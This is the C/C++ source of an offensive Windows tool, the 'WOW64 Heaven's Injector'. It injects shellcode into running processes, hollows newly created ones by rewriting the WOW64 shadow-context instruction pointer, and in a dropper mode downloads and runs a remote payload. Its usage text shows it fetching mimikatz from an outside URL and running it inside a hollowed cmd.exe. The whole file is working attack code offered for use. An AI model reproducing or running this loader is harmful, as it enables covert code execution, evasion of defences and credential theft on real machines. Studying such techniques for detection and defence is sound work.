// WOW64 Heaven's Injector in C/C++
// by aaaddress1@chroot.org
#include <stdio.h>
#include <vector>
#include <windows.h>
using namespace std;
#pragma warning(disable:4996)

#include "peb.h"
#include "shellcodify.h"
#include "http_download.h"

bool readBinFile(const wchar_t fileName[], char** bufPtr, DWORD& length) {
	if (FILE* fp = _wfopen(fileName, L"rb")) {
		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		*bufPtr = new char[length + 1];
		fseek(fp, 0, SEEK_SET);
		fread(*bufPtr, sizeof(char), length, fp);
		return true;
	}
	return false;
}

uint32_t getShadowContext32(HANDLE hProcess, uint32_t PEB) {
	uint32_t teb32 = PEB + 0x3000, teb64 = teb32 - 0x2000, ptrCtx = 0;
	ReadProcessMemory(hProcess, (LPCVOID)(teb64 + 0x1488), &ptrCtx, sizeof(ptrCtx), 0);
	return ptrCtx + 4;
}

void hollowing(const PWSTR path, const BYTE* shellcode, DWORD shellcodeSize)                                                                                                                                                                {
	wchar_t pathRes[MAX_PATH] = { 0 };
	PROCESS_INFORMATION PI = { 0 };
	STARTUPINFOW SI = { 0 };
	CONTEXT CTX = { 0 };
	memcpy(pathRes, path, sizeof(pathRes));

	CreateProcessW(pathRes, NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);
	size_t shellcodeAddr = (size_t)VirtualAllocEx(PI.hProcess, 0, shellcodeSize, 0x3000, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(PI.hProcess, (void*)shellcodeAddr, shellcode, shellcodeSize, 0);

	CTX.ContextFlags = CONTEXT_FULL;
	GetThreadContext(PI.hThread, (&CTX));
	uint32_t remoteContext = getShadowContext32(PI.hProcess, CTX.Ebx);
	
	WriteProcessMemory(PI.hProcess, LPVOID(remoteContext + offsetof(CONTEXT, Eip)), LPVOID(&shellcodeAddr), 4, 0);
	WaitForSingleObject(PI.hProcess, INFINITE);
}

void inject(WORD pid, const BYTE* shellcode, DWORD shellcodeSize) {
	auto hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	size_t shellcodeAddr = (size_t)VirtualAllocEx(hProc, 0, shellcodeSize, 0x3000, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProc, (void*)shellcodeAddr, shellcode, shellcodeSize, 0);
	wprintf(L"[+] shellcode current at %x\n", shellcodeAddr);

	auto peb = (PROCESS_BASIC_INFORMATION*)QueryProcessInformation(hProc, 0, sizeof(PROCESS_BASIC_INFORMATION));
	auto k = getShadowContext32(hProc, (uint32_t)peb->PebBaseAddress) + offsetof(CONTEXT, Eip);
	WriteProcessMemory(hProc, LPVOID(k), LPVOID(&shellcodeAddr), 4, 0);
}

int wmain(int argc, wchar_t** argv) {
	if (argc < 3) {
		wprintf(L"WOW64 Injector - Abusing WOW64 Layer to Inject, by aaaddress1@chroot.org\n");
		wprintf(L"usage: ./wowInjector [option] [payload] [destination]\n");
		wprintf(L"  -- \n");

		wprintf(L"  ex#1 ./wowInjector injection  C:/msgbox.exe [PID]\n");
		wprintf(L"  ex#2 ./wowInjector hollowing  C:/msgbox.exe C:/Windows/SysWOW64/notepad.exe\n");
		wprintf(L"  ex#3 ./wowInjector dropper    http://30cm.tw/mimikatz.exe C:/Windows/SySWOW64/cmd.exe\n");
		wprintf(L"\n");
		return 0;
	}
	bool mode_Dropper = !wcsicmp(argv[1], L"dropper"), 
		 mode_Inject = !wcsicmp(argv[1], L"injection"),
		 mode_Hollowing = !wcsicmp(argv[1], L"hollowing");

	PCHAR ptrToExe(0), ptrToShc(0); DWORD lenExe, lenShc;
	if (mode_Inject || mode_Hollowing) {
		wprintf(L"[?] read payload from %s\n", argv[2]);
		if (readBinFile(argv[2], &ptrToExe, lenExe))
			wprintf(L"[v] read sourece exe file ok.\n");
		else
			wprintf(L"[x] fail to read source exe file.\n");
	}
	else if (mode_Dropper) {
		wprintf(L"[?] download payload from %s\n", argv[2]);
		auto binPayload = httpRecv(argv[2]);
		lenExe = binPayload->size();
		ptrToExe = &(*binPayload)[0];
	}
	else
		wprintf(L"[x] fail to fetch payload?\n");

	if (ptrToShc = shellcodify(ptrToExe, lenExe, lenShc))
		wprintf(L"[v] prepare payload shellcode okay.\n");
	else
		wprintf(L"[x] fail to transform exe to shellcode.\n");

	if (mode_Inject) {
		wprintf(L"[!] enter inject mode...\n");
		int pid; swscanf(argv[3], L"%i", &pid);
		wprintf(L"[$] process injection [pid = %i]\n", pid);
		inject(pid, (PBYTE)ptrToShc, lenShc);
	}
	else if (mode_Hollowing) {
		wprintf(L"[!] enter hollowing mode...\n");
		wprintf(L"[$] process hollowing: %s\n", argv[2]);
		hollowing(argv[3], (PBYTE)ptrToShc, lenShc);
	}
	else if (mode_Dropper) {
		wprintf(L"[!] enter dropper mode...\n");
		hollowing(argv[3], (PBYTE)ptrToShc, lenShc);
	}
	else wprintf(L"[!] unknown action?\n");
	wprintf(L"\ndone.");
	return 0;
}
